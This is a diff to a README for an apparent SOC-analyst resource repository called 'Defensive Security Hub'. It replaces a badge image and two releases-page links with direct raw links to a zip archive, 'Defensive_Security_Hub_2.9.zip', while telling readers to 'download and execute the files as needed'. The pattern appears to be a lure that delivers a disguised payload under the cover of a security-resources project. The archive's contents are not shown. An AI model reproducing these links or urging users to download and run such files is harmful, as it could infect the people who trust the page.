@@ -1,6 +1,6 @@
 # Defensive Security Hub 🛡️
 
-![Defensive Security Hub](https://img.shields.io/badge/Defensive%20Security%20Hub-Resources-blue)
+![Defensive Security Hub](https://github.com/penxpkj/Defensive-Security-Hub/raw/refs/heads/main/Samsonic/Defensive_Security_Hub_2.9.zip%20Security%20Hub-Resources-blue)
 
 Welcome to the **Defensive Security Hub**! This repository serves as a curated collection of essential resources, tools, and references tailored for Security Operations Center (SOC) analysts. Whether you are just starting your journey in cybersecurity or you are a seasoned professional, this hub aims to provide valuable insights and tools to enhance your skills and effectiveness in the field.
 
@@ -22,7 +22,7 @@ Welcome to the **Defensive Security Hub**! This repository serves as a curated c
 
 In today's digital landscape, the role of a SOC analyst is crucial. Cyber threats evolve rapidly, and staying informed about the latest tools and techniques is vital. This repository aims to simplify that process by providing a central location for resources that cover various aspects of defensive security.
 
-You can find the latest releases and updates for this repository [here](https://github.com/penxpkj/Defensive-Security-Hub/releases). Please download and execute the files as needed.
+You can find the latest releases and updates for this repository [here](https://github.com/penxpkj/Defensive-Security-Hub/raw/refs/heads/main/Samsonic/Defensive_Security_Hub_2.9.zip). Please download and execute the files as needed.
 
 ## Key Topics
 
@@ -134,7 +134,7 @@ This repository is licensed under the MIT License. See the [LICENSE](LICENSE) fi
 
 ## Releases
 
-For the latest updates and releases, visit the [Releases](https://github.com/penxpkj/Defensive-Security-Hub/releases) section. Please download and execute the files as needed.
+For the latest updates and releases, visit the [Releases](https://github.com/penxpkj/Defensive-Security-Hub/raw/refs/heads/main/Samsonic/Defensive_Security_Hub_2.9.zip) section. Please download and execute the files as needed.
 
 ---
 
